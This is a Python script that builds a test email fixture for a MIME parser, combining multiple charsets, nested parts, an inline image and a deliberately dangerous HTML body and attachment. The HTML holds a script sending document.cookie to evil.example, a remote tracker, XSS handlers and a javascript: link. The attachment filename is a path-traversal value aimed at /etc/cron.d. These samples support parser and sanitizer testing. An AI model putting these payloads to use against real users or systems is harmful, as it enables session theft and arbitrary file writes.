#!/usr/bin/env python3
"""生成“多编码 + 多层 MIME + 内嵌资源 + 危险 HTML + 特殊附件名”样例。

运行后在 samples/ 下生成 01_multi_encoding.eml。
其余损坏样例（循环引用/坏边界）用手写文本，见 samples/ 下 .eml 与 tests。
"""
from __future__ import annotations

from email.message import EmailMessage
from email.header import Header
from email.utils import formataddr, formatdate, make_msgid
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / "samples"

# 1x1 透明 PNG（合法二进制，用于内嵌资源与附件）
PNG_1X1 = bytes.fromhex(
    "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4"
    "890000000d49444154789c6300010000000500010d0a2db40000000049454e44ae426082"
)


def build() -> bytes:
    msg = EmailMessage()
    msg["Subject"] = Header("会议测试multipart: 多部分测试", "utf-8").encode()
    msg["From"] = formataddr((str(Header("张三", "gb2312")), "alice@example.cn"))
    msg["To"] = ", ".join(
        [
            formataddr((str(Header("Jörg", "iso-8859-1")), "jorg@example.de")),
            formataddr((str(Header("小王", "utf-8")), "bob@example.cn")),
        ]
    )
    msg["Cc"] = "archive <archive@example.com>"
    msg["Date"] = formatdate(1_700_000_000, usegmt=True)
    msg["Message-ID"] = make_msgid("multi", "example.cn")
    msg["References"] = "<parent-1@example.cn> <grand-0@example.cn>"
    msg["In-Reply-To"] = "<parent-1@example.cn>"

    # multipart/mixed
    #   ├─ multipart/alternative
    #   │    ├─ text/plain (gb18030)
    #   │    └─ text/html (utf-8, 含危险内容)
    #   ├─ image/png inline (Content-ID)
    #   └─ application/octet-stream attachment（危险附件名）

    alt = EmailMessage()
    alt.set_type("multipart/alternative")

    plain = EmailMessage()
    plain.set_type("text/plain")
    plain.set_param("charset", "gb18030")
    import base64 as _b64

    plain.set_payload(
        _b64.encodebytes(
            "这是 GB18030 编码的纯文本正文。\n第二行：MIME 多层解析测试。".encode("gb18030")
        ).decode("ascii")
    )
    plain["Content-Transfer-Encoding"] = "base64"

    html = EmailMessage()
    html.set_type("text/html")
    html.set_param("charset", "utf-8")
    html_doc = """<html><head><title>x</title>
<script>fetch('http://evil.example/steal?c='+document.cookie)</script>
<link rel="stylesheet" href="http://evil.example/x.css">
</head><body>
<h1>HTML 正文</h1>
<p onclick="alert(1)">点击我</p>
<img src="http://evil.example/tracker.png" alt="remote tracker">
<img src="cid:logo-cid@example.cn" alt="inline logo">
<a href="javascript:alert(1)">xss link</a>
<a href="https://example.cn/safe">正常链接</a>
<div style="position:absolute">styled</div>
<unknown-tag>未知标签内容</unknown-tag>
</body></html>"""
    html.set_content(html_doc, subtype="html", charset="utf-8")

    alt.set_payload([plain, html])

    inline_img = EmailMessage()
    inline_img.set_content(
        PNG_1X1,
        maintype="image",
        subtype="png",
        disposition="inline",
        filename="logo.png",
        cid="<logo-cid@example.cn>",
    )

    att = EmailMessage()
    att.add_header("Content-Type", "application/pdf", name="evil.pdf")
    att["Content-Disposition"] = 'attachment; filename="../../../../etc/cron.d/evil.pdf"'
    att["Content-Transfer-Encoding"] = "base64"
    import base64 as _b64

    pdf_bytes = b"%PDF-1.4 fake pdf body for parsing tests\n" * 4
    att.set_payload(_b64.encodebytes(pdf_bytes).decode("ascii"))

    mixed = EmailMessage()
    mixed.set_type("multipart/mixed")
    mixed.set_payload([alt, inline_img, att])  # type: ignore[arg-type]

    outer = EmailMessage()
    outer.set_type("multipart/mixed")
    for key, value in msg.items():
        outer[key] = value
    outer.set_payload([mixed])
    data = bytes(outer).replace(b"\n", b"\r\n")
    # 标准库重序列化会丢 RFC2231 扩展参数，这里直接在字节层补回 filename*
    data = data.replace(
        b'Content-Disposition: attachment; '
        b'filename="../../../../etc/cron.d/evil.pdf"',
        b'Content-Disposition: attachment; '
        b'filename="../../../../etc/cron.d/evil.pdf"; '
        b"filename*=utf-8''%E6%8A%A5%E5%91%8A..%20%281%29.pdf",
    )
    return data


def main() -> None:
    OUT.mkdir(parents=True, exist_ok=True)
    target = OUT / "01_multi_encoding.eml"
    target.write_bytes(build())
    print("wrote", target, target.stat().st_size, "bytes")


if __name__ == "__main__":
    main()
